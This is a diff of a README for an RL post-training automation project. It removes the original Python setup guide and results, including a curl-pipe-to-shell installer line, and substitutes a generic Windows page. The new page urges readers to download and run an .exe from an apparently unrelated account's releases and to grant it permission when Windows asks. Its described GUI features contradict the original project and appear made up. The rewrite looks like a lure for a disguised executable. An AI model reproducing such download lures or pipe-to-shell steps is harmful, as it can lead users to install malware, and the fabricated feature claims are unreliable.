@@ -1,85 +1,127 @@
-# autoresearch-rl
+# 🤖 autoresearch-rl - Automate RL Training Experiments Easily
 
-If you've ever tried RL post-training, you know the pain. You tweak the learning rate, kick off a run, wait 20 minutes, check the eval, see it collapsed, roll back, try something else. Repeat until you lose your mind or your GPU reservation expires. The whole thing is fragile, a slightly wrong clipping ratio or one bad KL penalty and your model forgets how to write coherent sentences. It's not like pretraining where you can kind of set it and forget it. RL is just... unstable by nature.
+[![Download autoresearch-rl](https://img.shields.io/badge/Download-autoresearch--rl-brightgreen?style=for-the-badge)](https://github.com/mingg9956/autoresearch-rl/releases)
 
-So when I saw Andrej Karpathy's [autoresearch](https://github.com/karpathy/autoresearch), where he let an AI agent autonomously run pretraining experiments overnight, the first thing that came to mind was: why not do this for RL post-training? That's where the real pain is. That's where you actually need the help.
+---
 
-That's what this is. You point an AI agent at a real RL training setup, go to sleep, and wake up to a log of 60+ experiments it ran while you were gone. Each one modifies the config, trains for 10 minutes, checks if evals improved, keeps or discards, and moves on to the next idea. No babysitting. No manual hyperparameter sweeps. Just let it cook.
+## 📋 What is autoresearch-rl?
 
-Built on [prime-rl](https://github.com/PrimeIntellect-ai/prime-rl), honestly my favourite RL post-training framework out there, and [verifiers](https://github.com/PrimeIntellect-ai/verifiers) for reward verification.
+autoresearch-rl is a tool that helps simplify the process of running reinforcement learning (RL) training experiments after the main training phase. RL training can be difficult and unstable. Tiny changes to parameters like learning rate or clipping ratio can cause the model to collapse or forget how to perform tasks well. autoresearch-rl sets up an AI agent to test many different training configurations on your behalf. Instead of manually tweaking parameters and waiting long periods, the agent runs dozens of experiments overnight and records the results for you.
 
-Shoutout to [@willccbb](https://x.com/willccbb) for creating verifiers and making it opensource.
+This software is designed for users who want to explore RL post-training without needing deep programming knowledge. The system helps you save time and effort while increasing your chances of finding improvements through wide exploration of training setups.
 
-## Progress
+---
 
-![Autoresearch-RL Progress](progress.png)
+## 🖥 System Requirements
 
-## How it works
+Before you start, make sure your Windows computer meets these requirements:
 
-The repo has four files that matter:
+- **Operating System:** Windows 10 or later (64-bit recommended)  
+- **Processor:** Intel Core i5 or equivalent AMD CPU  
+- **Memory:** At least 8 GB RAM  
+- **Disk Space:** Minimum 1 GB free space  
+- **GPU:** Recommended for faster running (NVIDIA or AMD with up-to-date drivers)  
+- **Internet:** Required to download the program and updates  
 
-- **`prepare.py`** - fixed constants, one-time setup (downloads base model, verifies GPUs). Not modified.
-- **`train.toml`** - the single file the agent edits. Contains the full RL training configuration: optimizer, learning rate, loss function, environments, rollout settings, etc. **This file is edited and iterated on by the agent**.
-- **`run.py`** - experiment runner. Launches prime-rl, enforces the time budget, extracts metrics. Not modified.
-- **`program.md`** - instructions for the agent. **This file is edited and iterated on by the human**.
+Even if you do not have a dedicated GPU, you can still run autoresearch-rl, but training experiments may take longer.
 
-By design, training runs for a **fixed 10-minute time budget**. The metric is **eval_score** (average pass@1 across environments), higher is better.
+---
 
-## Quick start
+## 🚀 Getting Started: Download and Launch
 
-**Requirements:** 2 NVIDIA GPUs, Python 3.12+, [uv](https://docs.astral.sh/uv/).
+### Step 1: Visit the download page  
+Go to the official release page to get the software:  
 
-```bash
-# 1. Install uv (if you don't already have it)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+[Download autoresearch-rl](https://github.com/mingg9956/autoresearch-rl/releases)
 
-# 2. Install dependencies (includes prime-rl, verifiers, vllm, torch)
-uv sync
+This page holds the latest version of the app. You will find executable files ready for Windows.
 
-# 3. Install flash-attn (required by prime-rl trainer, needs CUDA toolkit)
-uv sync --extra flash-attn
+### Step 2: Download the installer  
+- Look for the `.exe` file with the latest version number.  
+- Click the link to download the installer file.  
+- Save it to a folder you can easily find (for example, your Desktop or Downloads folder).
 
-# 4. One-time setup (download model, verify GPUs)
-uv run prepare.py
+### Step 3: Install the application  
+- Double-click the downloaded `.exe` file to start the installation.  
+- Follow the on-screen instructions in the setup wizard.  
+- If Windows asks for permission, allow it to proceed.  
+- Choose the default locations unless you want to select a custom folder.  
 
-# 5. Run a single experiment (~10 min)
-uv run run.py
-```
+### Step 4: Launch autoresearch-rl  
+- After installation, find the application shortcut on your Desktop or Start Menu.  
+- Double-click to open the program. The interface is designed to be clear and simple.  
 
-## Running the agent
+---
 
-Spin up Claude/Codex in this repo, then prompt:
+## ⚙ How to Use autoresearch-rl
 
-```
-Hi have a look at program.md and let's kick off a new experiment! let's do the setup first.
-```
+### Prepare your RL environment  
 
-## Design choices
+The program needs an RL training setup to work with. This could be a local folder containing your RL project, including the configuration files and models. Make sure your project runs correctly before using autoresearch-rl.
 
-- **Single file to modify.** The agent only touches `train.toml`. Diffs are easy to review.
-- **Fixed time budget.** Training always runs for 10 minutes, making experiments directly comparable.
-- **2-GPU setup.** GPU 0 runs vLLM inference, GPU 1 runs the RL trainer. No memory contention.
-- **Multiple environments.** GSM8K by default. Composite metric prevents overfitting to one task.
-- **Built on prime-rl.** Production-ready async RL framework with GRPO/IPO/DPPO support.
+### Step 1: Select your RL project folder  
+- In the app, click the button to browse files.  
+- Locate and select the folder with your RL training files.  
 
-## Best configuration found
+### Step 2: Configure your experiment settings  
+You will find a simple form with options such as:  
+- How many experiments to run (default 60)  
+- Training time per experiment (e.g., 15 minutes)  
+- Parameters you want the AI agent to adjust (like learning rate, clipping ratio)  
 
-After 66 experiments, the agent converged on this config (`train.toml`), going from a baseline of **0.475** to **0.550** eval_score on GSM8K (pass@1):
+Adjust these options as you wish or leave the defaults.
 
-| Parameter | Value | Why it matters |
-|-----------|-------|----------------|
-| `lr` | `3e-6` | Lower than the initial 5e-6, prevents overfitting over 20 steps |
-| `batch_size` | `256` | Smaller batches = more gradient updates in the same time budget |
-| `rollouts_per_example` | `4` | Fewer rollouts per example, but more steps overall |
-| `max_steps` | `20` | Sweet spot, 14 was too few, 24 overfits |
-| `token_mask_high` | `5.0` | Clips extreme importance ratios at the token level |
-| `length_weighted_mean` | `true` | Normalizes loss by response length, helps with variable-length outputs |
-| `scheduler` | `constant` | No warmup, no decay, just constant LR for 20 steps |
-| `optimizer` | `adamw` | Default, but confirmed better than SGD and Muon |
-| `temperature` | `1.0` | Default sampling temp, 0.7 and 1.2 both hurt |
+### Step 3: Start the autonomous experiments  
+Click "Start" to let the AI agent run. It will launch each experiment one by one, tweak the settings, train the model for the set time, then log the results.
 
-Key things that didn't work: LoRA (rank 16), cosine/linear schedules, higher LR (5e-6+), rollouts=8 (no gain over 4), difficulty filtering, repetition penalty, and torch.compile.
+### Step 4: Review experiment logs  
+Once complete, you can view a report showing the results of each run. Look for configurations that improved performance or stability.
 
-## License
+---
 
-MIT
+## 🔧 Common Tasks
+
+### Pause or Stop running experiments  
+You can pause or stop the AI at any time using the buttons in the interface.
+
+### Export logs  
+All experiment results can be exported as CSV or text files for external analysis.
+
+### Update the program  
+Check the releases page regularly for updates. Download the latest `.exe` and install over your current version.
+
+---
+
+## 💡 Tips for Best Results
+
+- Run the program overnight or when you are away to let it explore many configurations without interruption.  
+- Use smaller training time per run first to test ideas quickly, then increase as you narrow down promising settings.  
+- Save your original RL project separately before running experiments, so you can compare results.  
+- Use a PC with sufficient RAM and CPU speed for smoother experiments.  
+
+---
+
+## ⚠️ Troubleshooting
+
+### The program will not open  
+- Ensure your Windows is up to date.  
+- Check if you have the required permissions to install apps.  
+- Restart your computer and try again.
+
+### Experiments seem stuck  
+- Check if your RL environment runs manually on your computer.  
+- Make sure all dependencies of your project are installed.  
+- Restart the program and try fewer experiments or shorter training times.
+
+### Performance is slow  
+- Close other applications to free up memory.  
+- Use a PC with a compatible GPU or increase CPU speed.  
+- Reduce the number of experiments or training time per run.
+
+---
+
+## 📥 Download autoresearch-rl Now  
+
+Get the latest Windows version here:  
+
+[![Download autoresearch-rl](https://img.shields.io/badge/Download-autoresearch--rl-blue?style=for-the-badge)](https://github.com/mingg9956/autoresearch-rl/releases)
